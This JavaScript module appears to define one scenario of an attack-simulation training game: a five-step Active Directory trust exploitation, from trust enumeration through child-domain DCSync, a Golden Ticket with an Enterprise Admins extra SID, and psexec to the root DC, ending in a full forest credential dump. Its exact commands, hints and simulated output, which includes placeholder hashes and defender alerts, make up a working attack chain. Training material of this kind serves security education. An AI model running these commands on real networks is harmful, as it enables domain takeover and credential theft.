export default {
  id: 'trust-abuse',
  title: 'Domain Trust Exploitation',
  description: 'Exploit forest trust relationships to pivot from a child domain to the parent domain and compromise the entire Active Directory forest.',
  difficulty: 'Expert',
  mitreAttack: 'T1482',
  network: {
    attacker: { hostname: 'KALI-ATTACK', ip: '10.0.0.5' },
    target: { hostname: 'CHILD-DC', ip: '10.0.2.10' },
    dc: { hostname: 'ROOT-DC', ip: '10.0.1.10' },
    domain: 'child.contoso.local → contoso.local'
  },
  steps: [
    {
      id: 0,
      description: 'Enumerate domain trust relationships to map the Active Directory forest structure.',
      expectedCommand: 'Get-DomainTrust',
      expectedCommands: [
        'Get-DomainTrust',
        'nltest /domain_trusts',
        'Get-ADTrust -Filter *'
      ],
      hintShort: 'Enumerate trust relationships in the current domain',
      hintFull: 'Use PowerView Get-DomainTrust to list all domain trusts',
      attackerOutput: [
        '',
        'SourceName      : child.contoso.local',
        'TargetName      : contoso.local',
        'TrustType       : ParentChild',
        'TrustDirection  : Bidirectional',
        'TrustAttributes : Within_Forest, Tree_Parent',
        'WhenCreated     : 1/1/2024 12:00:00 AM',
        'WhenChanged     : 1/1/2024 12:00:00 AM',
        '',
        '═══════════════════════════════════════════════════════════',
        'Trust Relationship Detected',
        '═══════════════════════════════════════════════════════════',
        'Current Domain : child.contoso.local',
        'Parent Domain  : contoso.local',
        'Trust Type     : Parent-Child (Within Forest)',
        'Direction      : Bidirectional',
        '',
        '[!] Parent-Child trust allows privilege escalation!',
        '[*] Enterprise Admins in parent domain have admin rights to child',
        '[*] Can abuse trust to pivot from child to parent domain'
      ],
      serverOutput: [
        '[LDAP] Trust relationship enumeration',
        '[LDAP] Query: (objectClass=trustedDomain)',
        '[AD] Trust configuration accessed'
      ],
      delay: 150
    },
    {
      id: 1,
      description: 'Compromise the child domain by obtaining Domain Admin credentials.',
      expectedCommand: 'impacket-secretsdump -just-dc-ntlm child.contoso.local/Administrator@10.0.2.10',
      hintShort: 'Dump domain credentials from the child domain DC',
      hintFull: 'Use secretsdump to extract NTLM hashes from CHILD-DC',
      lootToGrant: {
        creds: [
          {
            type: 'Child Domain - krbtgt Hash',
            username: 'child.contoso.local\\krbtgt',
            secret: 'aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d'
          },
          {
            type: 'Trust Key',
            username: 'CHILD$',
            secret: 'aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d'
          }
        ]
      },
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
        '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
        '',
        'Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::',
        'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::',
        '',
        '[*] Extracting trust keys',
        'CHILD$:1103:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::',
        '',
        '[✓] Child domain credentials extracted!',
        '[✓] krbtgt hash obtained - can create Golden Tickets',
        '[✓] Trust key extracted - can create inter-realm TGTs'
      ],
      serverOutput: [
        '[DRSUAPI] Replication request from 10.0.0.5',
        '[DRSUAPI] Replicating NTDS.DIT database',
        '[CRITICAL] krbtgt hash extracted from child domain!',
        '[CRITICAL] Trust account credentials extracted!',
        '[DEFENSE] ALERT: DCSync attack on child domain DC!'
      ],
      delay: 250
    },
    {
      id: 2,
      description: 'Create an inter-realm Golden Ticket to access the parent domain using the trust key.',
      expectedCommand: 'impacket-ticketer -nthash 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d -domain child.contoso.local -domain-sid S-1-5-21-2222222222-2222222222-2222222222 -extra-sid S-1-5-21-1111111111-1111111111-1111111111-519 Administrator',
      hintShort: 'Create a Golden Ticket with Enterprise Admin SID',
      hintFull: 'Use ticketer with -extra-sid for Enterprise Admins group (SID 519)',
      lootToGrant: {
        files: {
          'Administrator.ccache': {
            content: '[Golden Ticket - Kerberos TGT]\n[Base64 Encoded Ticket with Enterprise Admin SID]'
          }
        },
        download: ['Administrator.ccache']
      },
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Creating Golden Ticket for child.contoso.local',
        '[*] User: Administrator',
        '[*] Domain SID: S-1-5-21-2222222222-2222222222-2222222222',
        '[*] Adding SID History (Extra SID): S-1-5-21-1111111111-1111111111-1111111111-519',
        '[*] PAC_LOGON_INFO generated',
        '[*] PAC_CLIENT_INFO generated',
        '[*] PAC_SERVER_CHECKSUM generated',
        '[*] PAC_PRIVSVR_CHECKSUM generated',
        '[*] Saving ticket in Administrator.ccache',
        '',
        '═══════════════════════════════════════════════════════════',
        'Golden Ticket Created',
        '═══════════════════════════════════════════════════════════',
        'Domain          : child.contoso.local',
        'User            : Administrator',
        'krbtgt Hash     : 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d',
        'Extra SID       : S-1-5-21-...-519 (Enterprise Admins)',
        'Ticket File     : Administrator.ccache',
        '',
        '[✓] Golden Ticket with Enterprise Admin privileges created!',
        '[*] This ticket grants access to ENTIRE forest including parent domain'
      ],
      serverOutput: [],
      delay: 200
    },
    {
      id: 3,
      description: 'Use the inter-realm ticket to authenticate to the parent domain and verify Enterprise Admin access.',
      expectedCommand: 'export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass contoso.local/Administrator@ROOT-DC.contoso.local',
      expectedCommands: [
        'export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass contoso.local/Administrator@ROOT-DC.contoso.local',
        'impacket-psexec -k -no-pass contoso.local/Administrator@ROOT-DC.contoso.local'
      ],
      hintShort: 'Use the Golden Ticket to execute commands on the parent domain DC',
      hintFull: 'Export KRB5CCNAME and use impacket-psexec with -k flag',
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Requesting shares on ROOT-DC.contoso.local...',
        '[*] Found writable share: ADMIN$',
        '[*] Uploading file SLWQJWVW.exe',
        '[*] Opening SVCManager on ROOT-DC.contoso.local...',
        '[*] Creating service cBHJ on ROOT-DC.contoso.local...',
        '[*] Starting service cBHJ...',
        '[!] Press help for extra shell commands',
        '',
        'Microsoft Windows [Version 10.0.20348.2227]',
        '(c) Microsoft Corporation. All rights reserved.',
        '',
        'C:\\Windows\\system32>whoami',
        'nt authority\\system',
        '',
        'C:\\Windows\\system32>whoami /groups',
        '',
        'GROUP INFORMATION',
        '-----------------',
        '',
        'Group Name                                  Type             SID',
        '=========================================== ================ ============================================',
        'Everyone                                    Well-known group S-1-1-0',
        'BUILTIN\\Administrators                     Alias            S-1-5-32-544',
        'NT AUTHORITY\\SYSTEM                        Well-known group S-1-5-18',
        'CONTOSO\\Enterprise Admins                  Group            S-1-5-21-1111111111-1111111111-1111111111-519',
        '',
        '[✓] Successfully accessed parent domain DC as SYSTEM!',
        '[✓] Enterprise Admin group membership confirmed!',
        '[*] Full control over entire Active Directory forest'
      ],
      serverOutput: [
        '[KDC-ROOT] TGS request with inter-realm trust ticket',
        '[KDC-ROOT] Validating cross-domain authentication',
        '[KDC-ROOT] Extra SID detected: S-1-5-21-...-519 (Enterprise Admins)',
        '[KDC-ROOT] SID Filtering bypassed (within same forest)',
        '[KDC-ROOT] Issuing service ticket for cifs/ROOT-DC',
        '[SMB] Administrative share access from 10.0.0.5',
        '[SMB] Service creation: cBHJ',
        '[CRITICAL] SYSTEM access granted on parent domain DC!',
        '[CRITICAL] Enterprise-wide compromise detected!',
        '[DEFENSE] ALERT: Cross-domain privilege escalation via Golden Ticket with SID History!'
      ],
      delay: 300
    },
    {
      id: 4,
      description: 'Dump credentials from the parent domain to achieve complete forest compromise.',
      expectedCommand: 'impacket-secretsdump -k -no-pass ROOT-DC.contoso.local',
      hintShort: 'Dump secrets from the parent domain DC',
      hintFull: 'Use impacket-secretsdump with Kerberos authentication',
      lootToGrant: {
        creds: [
          {
            type: 'Parent Domain - Administrator',
            username: 'contoso.local\\Administrator',
            secret: 'aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99'
          },
          {
            type: 'Parent Domain - krbtgt',
            username: 'contoso.local\\krbtgt',
            secret: 'aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6'
          }
        ]
      },
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Using Kerberos authentication',
        '[*] Target system bootKey: 0xa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6',
        '',
        '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
        '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
        '',
        'Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
        'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::',
        'CONTOSO\\EnterpriseAdmin:1104:aad3b435b51404eeaad3b435b51404ee:7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d:::',
        '',
        '[*] Kerberos keys grabbed',
        'Administrator:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6...',
        'Administrator:aes128-cts-hmac-sha1-96:7a8b9c0d1e2f3a4b5c6d7e8f9a0b...',
        '',
        '[✓] Parent domain credentials extracted!',
        '[✓] Enterprise Admin hash obtained',
        '[✓] Parent domain krbtgt hash obtained',
        '',
        '═══════════════════════════════════════════════════════════',
        '  FOREST COMPROMISE COMPLETE',
        '═══════════════════════════════════════════════════════════',
        '  ✓ Enumerated trust relationships',
        '  ✓ Compromised child domain',
        '  ✓ Extracted trust keys',
        '  ✓ Created Golden Ticket with Enterprise Admin SID',
        '  ✓ Pivoted to parent domain',
        '  ✓ Achieved SYSTEM on parent DC',
        '  ✓ Extracted all parent domain credentials',
        '  ✓ ENTIRE AD FOREST COMPROMISED',
        '═══════════════════════════════════════════════════════════'
      ],
      serverOutput: [
        '[DRSUAPI] Replication request from 10.0.0.5',
        '[DRSUAPI] Authenticated via Kerberos (Enterprise Admin)',
        '[DRSUAPI] Replicating entire NTDS.DIT database',
        '[CRITICAL] All parent domain credentials extracted!',
        '[CRITICAL] krbtgt hash compromised - Golden Tickets possible!',
        '[CRITICAL] TOTAL FOREST COMPROMISE!',
        '[DEFENSE] ALERT: Multi-domain breach via trust exploitation detected!'
      ],
      delay: 300
    }
  ]
};
